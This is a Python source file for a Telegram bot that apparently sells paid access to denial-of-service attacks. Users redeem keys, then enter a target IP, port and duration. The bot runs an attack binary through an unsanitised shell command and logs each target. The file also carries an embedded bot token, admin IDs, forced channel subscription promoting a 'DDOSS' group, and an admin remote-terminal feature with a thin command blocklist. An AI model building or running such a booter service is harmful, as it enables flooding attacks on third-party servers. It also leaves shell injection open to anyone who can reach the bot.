
# ===========================================================
#                  PRIVATE BOT SCRIPT
# ===========================================================

# --------------------[ IMPORTS ]----------------------------

import os
import time
import json
import pytz
import json
import random
import string
import telebot
import datetime
import subprocess
import threading
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import telebot
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --------------------[ CONFIGURATION ]----------------------


# Insert your Telegram bot token here
bot = telebot.TeleBot('7430969189:AAEbFOrUjp7muhik3xsdk9YZkOJ9THIxB2Q')

# Insert your admin id here
admin_id = ["1917682089","2109683176","1079846534"]

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
IMAGE_DATA_FILE = "image_ids.json"

# Attack setting for users
ALLOWED_PORT_RANGE = range(10003, 30000)
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}


# --------------------[ IN-MEMORY STORAGE ]----------------------

users = {}
keys = {}
bot_data = {}
admin_sessions = {}
message_store = {}
user_cooldowns = {}
user_last_attack = {}

# --------------------[ STORAGE ]----------------------



# --- Data Loading and Saving Functions ---

def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)
        
def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)
        
# --- Utility Functions ---
def generate_key(length=10):
    characters = string.ascii_letters + string.digits
    key = ''.join(random.choice(characters) for _ in range(length))
    return f"PRIME-PK-{key.upper()}"  # Ensure key is in uppercase

def add_time_to_current_date(hours=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')

def convert_utc_to_ist(utc_time_str):
    utc_time = datetime.datetime.strptime(utc_time_str, '%Y-%m-%d %H:%M:%S')
    utc_time = utc_time.replace(tzinfo=pytz.utc)
    ist_time = utc_time.astimezone(pytz.timezone('Asia/Kolkata'))
    return ist_time.strftime('%Y-%m-%d %H:%M:%S')
    
def load_config():
    config_file = "config.json"

    if not os.path.exists(config_file):
        print(f"Config file {config_file} does not exist. Please create it.")
        exit(1)

    try:
        with open(config_file, 'r') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON in {config_file}: {str(e)}")
        exit(1)
    
config = load_config()

# --- Extract values from config.json ---
full_command_type = config["initial_parameters"]
threads = config.get("initial_threads")
packets = config.get("initial_packets")
binary = config.get("initial_binary")
MAX_ATTACK_TIME = config.get("max_attack_time")
ATTACK_COOLDOWN = config.get("attack_cooldown")

def save_config():
    config = {
        "initial_parameters": full_command_type,
        "initial_threads": threads,
        "initial_packets": packets,
        "initial_binary": binary,
        "max_attack_time": MAX_ATTACK_TIME,
        "attack_cooldown": ATTACK_COOLDOWN
    }

    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

# --- Log command function ---
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"{user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
        
# --------------------------------------------------------------
        
IMAGE_CHANNEL_ID = -1001136625811  # Replace with your private channel ID
ADMIN_ID = 1079846534  # Your Telegram user ID
ADMIN_CONTACT = "@Pk_chpora"  # Admin Telegram username

CHANNEL_1_USERNAME = "smalldevloper"  # Without @
CHANNEL_2_USERNAME = "PRIMEXARMYDDOSS"  # Without @
CHANNEL_1_URL = f"https://t.me/{CHANNEL_1_USERNAME}"
CHANNEL_2_URL = f"https://t.me/{CHANNEL_2_USERNAME}"

def load_image_ids():
    try:
        with open(IMAGE_DATA_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return []

def save_image_ids(image_ids):
    with open(IMAGE_DATA_FILE, "w") as file:
        json.dump(image_ids, file)

def add_image_ids(new_ids):
    image_ids = load_image_ids()
    image_ids.extend(new_ids)
    save_image_ids(image_ids)

def is_user_subscribed(user_id):
    try:
        status_1 = bot.get_chat_member(f"@{CHANNEL_1_USERNAME}", user_id).status
        status_2 = bot.get_chat_member(f"@{CHANNEL_2_USERNAME}", user_id).status
        joined_1 = status_1 in ["member", "administrator", "creator"]
        joined_2 = status_2 in ["member", "administrator", "creator"]
        return joined_1, joined_2
    except:
        return False, False

def get_join_buttons(user_id):
    joined_1, joined_2 = is_user_subscribed(user_id)
    
    markup = InlineKeyboardMarkup()
    
    if not joined_1:
        markup.add(InlineKeyboardButton("✅ Join Channel 1", url=CHANNEL_1_URL))
    if not joined_2:
        markup.add(InlineKeyboardButton("✅ Join Channel 2", url=CHANNEL_2_URL))
    
    markup.add(InlineKeyboardButton("🔄 Verify", callback_data="verify"))
    
    return markup

def get_help_button():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🤔 Confused? Click Here", callback_data="help"))
    return markup

def send_random_image(chat_id, user_id):
    user_info = bot.get_chat(user_id)  # Get user details
    username = user_info.username if user_info.username else "User"  # Fallback if no username

    image_ids = load_image_ids()
    if image_ids:
        random_message_id = random.choice(image_ids)
        caption = f"🔥𝐃𝐎𝐍’𝐓 𝐌𝐈𝐒𝐒 𝐎𝐔𝐓,@{username}!\n\n📢 𝐉𝐎𝐈𝐍 𝐀𝐋𝐋 𝐂𝐇𝐀𝐍𝐍𝐄𝐋𝐒 𝐓𝐎 𝐔𝐍𝐋𝐎𝐂𝐊 & 𝐄𝐗𝐏𝐋𝐎𝐑𝐄 𝐎𝐔𝐑 𝐁𝐎𝐓 𝐅𝐎𝐑 𝐅𝐑𝐄𝐄!\n\n🚀 𝐆𝐞𝐭 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐧𝐨𝐰 𝐚𝐧𝐝 𝐞𝐧𝐣𝐨𝐲 𝐚𝐥𝐥 𝐟𝐞𝐚𝐭𝐮𝐫𝐞𝐬 𝐰𝐢𝐭𝐡𝐨𝐮𝐭 𝐥𝐢𝐦𝐢𝐭𝐬! 🔥"

        msg = bot.copy_message(chat_id, IMAGE_CHANNEL_ID, random_message_id, caption=caption, reply_markup=get_join_buttons(user_id))
        
        # Auto-delete Help button in 15 seconds
        threading.Thread(target=auto_delete_message, args=(chat_id, msg.message_id, 15)).start()
        
    else:
        bot.send_message(chat_id, "❌ No img available. Contact admin.")

@bot.message_handler(commands=['start'])
def start_bot(message):
    user_id = message.from_user.id
    joined_1, joined_2 = is_user_subscribed(user_id)

    if joined_1 and joined_2:
        image_ids = load_image_ids()
        if image_ids:
            random_message_id = random.choice(image_ids)
            caption = "🎉𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗣𝗥𝗜𝗠𝗘 𝗫 𝗕𝗢𝗧 !\n𝐖𝐄’𝐑𝐄 𝐃𝐄𝐋𝐈𝐆𝐇𝐓𝐄𝐃 𝐓𝐎 𝐇𝐀𝐕𝐄 𝐘𝐎𝐔 𝐇𝐄𝐑𝐄.\n\n📌 𝐖𝐇𝐀𝐓 𝐘𝐎𝐔 𝐂𝐀𝐍 𝐃𝐎 𝐖𝐈𝐓𝐇 𝐓𝐇𝐈𝐒 𝐁𝐎𝐓:\n✅ Access premium features effortlessly \n✅ Get instant support whenever needed\n✅ Enjoy a smooth and seamless experience\n\n𝐍𝐄𝐄𝐃 𝐇𝐄𝐋𝐏? 𝐓𝐇𝐄 𝐁𝐔𝐓𝐓𝐎𝐍 𝐁𝐄𝐋𝐎𝐖 𝐅𝐎𝐑 𝐀𝐒𝐒𝐈𝐒𝐓𝐀𝐍𝐂𝐄!⬇️"
            msg = bot.copy_message(message.chat.id, IMAGE_CHANNEL_ID, random_message_id, caption=caption, reply_markup=get_help_button())
            
            # Auto-delete Help button in 10 seconds
            threading.Thread(target=auto_delete_message, args=(message.chat.id, msg.message_id, 25)).start()
            
        else:
            msg = bot.send_message(message.chat.id, "🎉 Welcome! You have full access to the bot.", reply_markup=get_help_button())
            
            # Auto-delete Help button in 10 seconds
            threading.Thread(target=auto_delete_message, args=(message.chat.id, msg.message_id, 25)).start()
            
    else:
        send_random_image(message.chat.id, user_id)

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify_subscription(call):
    user_id = call.from_user.id
    joined_1, joined_2 = is_user_subscribed(user_id)
    
    if joined_1 and joined_2:
        bot.answer_callback_query(call.id, "✅ Verified! You have access.")
        
        try:
            time.sleep(3)
            bot.delete_message(call.message.chat.id, call.message.message_id)  # Auto-delete verification message
        except:
            pass  # Ignore errors if message is already deleted

        # Send welcome message with Help button
        image_ids = load_image_ids()
        if image_ids:
            random_message_id = random.choice(image_ids)
            caption = "🎉𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗣𝗥𝗜𝗠𝗘 𝗫 𝗕𝗢𝗧 !\n𝐖𝐄’𝐑𝐄 𝐃𝐄𝐋𝐈𝐆𝐇𝐓𝐄𝐃 𝐓𝐎 𝐇𝐀𝐕𝐄 𝐘𝐎𝐔 𝐇𝐄𝐑𝐄.\n\n📌 𝐖𝐇𝐀𝐓 𝐘𝐎𝐔 𝐂𝐀𝐍 𝐃𝐎 𝐖𝐈𝐓𝐇 𝐓𝐇𝐈𝐒 𝐁𝐎𝐓:\n✅ Access premium features effortlessly \n✅ Get instant support whenever needed\n✅ Enjoy a smooth and seamless experience\n\n𝐍𝐄𝐄𝐃 𝐇𝐄𝐋𝐏? 𝐓𝐇𝐄 𝐁𝐔𝐓𝐓𝐎𝐍 𝐁𝐄𝐋𝐎𝐖 𝐅𝐎𝐑 𝐀𝐒𝐒𝐈𝐒𝐓𝐀𝐍𝐂𝐄!⬇️"
            msg = bot.copy_message(call.message.chat.id, IMAGE_CHANNEL_ID, random_message_id, caption=caption, reply_markup=get_help_button())
            
            # Auto-delete Help button in 10 seconds
            threading.Thread(target=auto_delete_message, args=(call.message.chat.id, msg.message_id, 15)).start()
            
        else:
            msg = bot.send_message(call.message.chat.id, "🎉😘😘😘😘 Welcome! You have full access to the bot.", reply_markup=get_help_button())
            
            # Auto-delete Help button in 10 seconds
            threading.Thread(target=auto_delete_message, args=(call.message.chat.id, msg.message_id, 15)).start()

    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined both channels. Please join and try again.")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=get_join_buttons(user_id))

@bot.callback_query_handler(func=lambda call: call.data == "help")
def help_button(call):
    # Send help message to user
    bot.send_message(call.message.chat.id, "🔓𝐓𝐎 𝐔𝐍𝐋𝐎𝐂𝐊 𝐀𝐋𝐋 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 & 𝐏𝐎𝐖𝐄𝐑 𝐔𝐏 𝐘𝐎𝐔𝐑 𝐓𝐎𝐎𝐋🔓\n\n 🍻𝐂𝐋𝐈𝐂𝐊 /Powerup\n\n✨ 𝐆𝐞𝐭 𝐫𝐞𝐚𝐝𝐲 𝐭𝐨 𝐬𝐞𝐞 𝐭𝐡𝐞 𝐦𝐚𝐠𝐢𝐜! ✨\n\n📲𝗖𝗼𝗻𝘁𝗲𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 @PRIME_X_ARMY_OWNER 𝘁𝗼 𝗯𝘂𝘆 𝗕𝗼𝘁 𝗣𝗹𝗮𝗻")
    
    # Delete the "Help" button message in 3 seconds
    threading.Thread(target=auto_delete_message, args=(call.message.chat.id, call.message.message_id, 3)).start()

def auto_delete_message(chat_id, message_id, delay):
    """Delete a message after a given delay in seconds."""
    time.sleep(delay)
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass  # Ignore errors if already deleted

@bot.message_handler(commands=['sendimage'])
def send_random_image_command(message):
    send_random_image(message.chat.id, message.from_user.id)

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    if message.from_user.id != ADMIN_ID:
        return

    photo = message.photo[-1]  
    sent_msg = bot.send_photo(IMAGE_CHANNEL_ID, photo.file_id)
    
    add_image_ids([sent_msg.message_id])
    bot.reply_to(message, f"✅ Image uploaded and stored!")
        
        
        
# --------------------[ KEYBOARD BUTTONS ]----------------------


@bot.message_handler(commands=['Powerup'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")    
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    
    # Show the "⚙️ Settings" and "⏺️ Terminal" buttons only to admins
    if str(message.chat.id) in admin_id:
        settings_button = types.KeyboardButton("⚙️ Settings")
        terminal_button = types.KeyboardButton("⏺️ Terminal")
        admin_button = types.KeyboardButton("🔰 Admin Panel")
        markup.add(attack_button, myinfo_button, redeem_button, settings_button, terminal_button, admin_button)
    else:
        markup.add(attack_button, myinfo_button, redeem_button)
    
    bot.reply_to(message, "𝗪𝗲𝗹𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗯𝗼𝘁!", reply_markup=markup)
    
@bot.message_handler(func=lambda message: message.text == "⚙️ Settings")
def settings_command(message):
    """Admin-only settings menu."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        threads_button = types.KeyboardButton("Threads")
        binary_button = types.KeyboardButton("Binary")
        packets_button = types.KeyboardButton("Packets")
        command_button = types.KeyboardButton("parameters")
        attack_cooldown_button = types.KeyboardButton("Attack Cooldown")
        attack_time_button = types.KeyboardButton("Attack Time")
        back_button = types.KeyboardButton("<< Back to Menu")

        markup.add(threads_button, binary_button, packets_button, command_button, attack_cooldown_button, attack_time_button, back_button)
        bot.reply_to(message, "⚙️ 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 𝗠𝗲𝗻𝘂", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "⏺️ Terminal")
def terminal_menu(message):
    """Show the terminal menu for admins."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        command_button = types.KeyboardButton("Command")
        upload_button = types.KeyboardButton("Upload")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(command_button, upload_button, back_button)
        bot.reply_to(message, "⚙️ 𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝗹 𝗠𝗲𝗻𝘂", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "🔰 Admin Panel")
def show_admin_panel(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        key_manager_button = types.KeyboardButton("Key Panel")
        access_manager_button = types.KeyboardButton("Access Panel")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(key_manager_button, access_manager_button, back_button)

        bot.reply_to(message, "🔰 𝗔𝗱𝗺𝗶𝗻 𝗽𝗮𝗻𝗲𝗹", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "Key Panel")
def show_key_manager(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        genkey_button = types.KeyboardButton("Generate Key")
        users_button = types.KeyboardButton("View Users")
        unused_keys_button = types.KeyboardButton("Unused Keys")
        remove_user_button = types.KeyboardButton("Remove User")
        back_manager_button = types.KeyboardButton("<< Back")
        markup.add(genkey_button, users_button, unused_keys_button, remove_user_button, back_manager_button)

        bot.reply_to(message, "🔑 𝗞𝗲𝘆 𝗣𝗮𝗻𝗲𝗹", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "Access Panel")
def show_access_manager(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        controll_button = types.KeyboardButton("Controll Access")
        add_user_button = types.KeyboardButton("Add User")
        back_manager_button = types.KeyboardButton("<< Back")
        markup.add(controll_button, add_user_button, back_manager_button)

        bot.reply_to(message, "🛠️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗣𝗮𝗻𝗲𝗹", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "<< Back")
def back_to_manager_menu(message):
    """Go back to the manager menu."""
    show_admin_panel(message)

@bot.message_handler(func=lambda message: message.text == "<< Back to Menu")
def back_to_main_menu(message):
    """Go back to the main menu."""
    start_command(message)

# ------------------------------------------------------------
    
    
    
    
# --------------------[ ATTACK SECTION ]----------------------
    
    
attack_in_process = False

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    global attack_in_process  # Access the global variable
    user_id = str(message.chat.id)
    
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱❗️"
            bot.reply_to(message, response)
            return       
    else:
        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
        return
    
    if attack_in_process:
        bot.reply_to(message, "⛔️ 𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.\n𝗨𝘀𝗲 /check 𝘁𝗼 𝘀𝗲𝗲 𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲!")
        return

    # Prompt the user for attack details
    response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
    bot.reply_to(message, response)
    bot.register_next_step_handler(message, process_attack_details)

# Global variable to track attack status and start time
attack_in_process = False
attack_start_time = None
attack_duration = 0  # Attack duration in seconds

# Function to handle the attack command
@bot.message_handler(commands=['check'])
def show_remaining_attack_time(message):
    if attack_in_process:
        # Calculate the elapsed time
        elapsed_time = (datetime.datetime.now() - attack_start_time).total_seconds()
        remaining_time = max(0, attack_duration - elapsed_time)  # Ensure remaining time doesn't go negative

        if remaining_time > 0:
            response = f"🚨 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀! 🚨\n\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲: {int(remaining_time)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀."
        else:
            response = "✅ 𝗧𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!"
    else:
        response = "✅ 𝗡𝗼 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀"

    bot.reply_to(message, response)

def run_attack(command):
    subprocess.Popen(command, shell=True)

attack_message = None

def process_attack_details(message):
    global attack_in_process, attack_start_time, attack_duration, attack_message
    attack_message = message  # Save the message object for later use
    user_id = str(message.chat.id)
    details = message.text.split()
    
    if len(details) != 3:
        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁❗️\n")
        return
    
    if user_id in user_last_attack:
        time_since_last_attack = (datetime.datetime.now() - user_last_attack[user_id]).total_seconds()
        if time_since_last_attack < ATTACK_COOLDOWN:
            remaining_cooldown = int(ATTACK_COOLDOWN - time_since_last_attack)
            bot.reply_to(message, f"⛔ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝘄𝗮𝗶𝘁 {remaining_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸𝗶𝗻𝗴 𝗮𝗴𝗮𝗶𝗻.")
            return
    
    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time = int(details[2])

            # Check if the target IP starts with an allowed prefix
            if not target.startswith(ALLOWED_IP_PREFIXES):
                bot.reply_to(message, "⛔️ 𝗘𝗿𝗿𝗼𝗿: 𝗨𝘀𝗲 𝘃𝗮𝗹𝗶𝗱 𝗜𝗣 𝘁𝗼 𝗮𝘁𝘁𝗮𝗰𝗸")
                return  # Stop further execution

            # Check if the port is within the allowed range
            if port not in ALLOWED_PORT_RANGE:
                bot.reply_to(message, f"⛔️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗮𝗿𝗲 𝗼𝗻𝗹𝘆 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗼𝗻 𝗽𝗼𝗿𝘁𝘀 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 [10003 - 29999]")
                return  # Stop further execution

            # Check if the port is in the blocked list
            if port in BLOCKED_PORTS:
                bot.reply_to(message, f"⛔️ 𝗣𝗼𝗿𝘁 {port} 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝗮𝗻𝗱 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝘂𝘀𝗲𝗱!")
                return  # Stop further execution

            # **Check if attack time exceeds MAX_ATTACK_TIME**
            if time > MAX_ATTACK_TIME:
                bot.reply_to(message, f"⛔️ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 {MAX_ATTACK_TIME} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀!")
                return  # Stop further execution
  
            else:
                # Modify full command type logic
                log_command(user_id, target, port, time)
                if full_command_type == 1:
                    full_command = f"./{binary} {target} {port} {time}"
                elif full_command_type == 2:
                    full_command = f"./{binary} {target} {port} {time} {threads}"
                elif full_command_type == 3:
                    full_command = f"./{binary} {target} {port} {time} {packets} {threads}"

                username = message.chat.username or "No username"

                # Set attack_in_process to True before sending the response
                attack_in_process = True
                attack_start_time = datetime.datetime.now()
                attack_duration = time  
                user_last_attack[user_id] = datetime.datetime.now()
            
                # Send response
                response = (f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
                        f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
                        f"𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
                        f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}")
                        
                bot.reply_to(message, response)

                # Run attack in a separate thread
                attack_thread = threading.Thread(target=run_attack, args=(full_command,))
                attack_thread.start()

                # Reset attack_in_process after the attack ends
                threading.Timer(time, reset_attack_status).start()

        except ValueError:
                bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁❗️")

def reset_attack_status():
    global attack_in_process
    attack_in_process = False

    # Send the attack finished message after the attack duration is complete
    bot.send_message(attack_message.chat.id, "✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!")
    
# ---------------------------------------------------------------------
#   
#
#
#
# --------------------[ USERS AND SYSTEM INFO ]----------------------

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    current_time = datetime.datetime.now()
    role = "Admin" if user_id in admin_id else "User"

    # Get expiration date safely
    expiration_date = users.get(user_id)

    if expiration_date:
        try:
            exp_datetime = datetime.datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S')
            if current_time < exp_datetime:
                status = "Active ✅"
                expiry_text = f"🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {convert_utc_to_ist(expiration_date)}\n"
            else:
                status = "Inactive ❌"
                expiry_text = "🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: Expired 🚫\n"  
        except ValueError:
            status = "Inactive ❌"
            expiry_text = "🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: Expired 🚫\n"
    else:
        status = "Inactive ❌"
        expiry_text = "🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: Not approved\n"

    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"🛂 𝗥𝗼𝗹𝗲: {role}\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"📳 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
        f"{expiry_text}"
    )

    bot.reply_to(message, response)
	
    
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)
        
@bot.message_handler(commands=['status'])
def status_command(message):
    """Show current status for threads, binary, packets, and command type."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Prepare the status message
        status_message = (
            f"☣️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦 ☣️\n\n"
            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {ATTACK_COOLDOWN}\n"
            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲: {MAX_ATTACK_TIME}\n\n"
            f"-----------------------------------\n"
            f"✴️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 ✴️\n\n"
            f"▶️ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲: {binary}\n"
            f"▶️ 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀: {full_command_type}\n"
            f"▶️ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {threads}\n"
            f"▶️ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀: {packets}\n"
        )
        bot.reply_to(message, status_message)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ TERMINAL SECTION ]----------------------

# List of blocked command prefixes
blocked_prefixes = ["nano", "sudo", "rm *", "rm -rf *", "screen"]

@bot.message_handler(func=lambda message: message.text == "Command")
def command_to_terminal(message):
    """Handle sending commands to terminal for admins."""
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱:")
        bot.register_next_step_handler(message, execute_terminal_command)
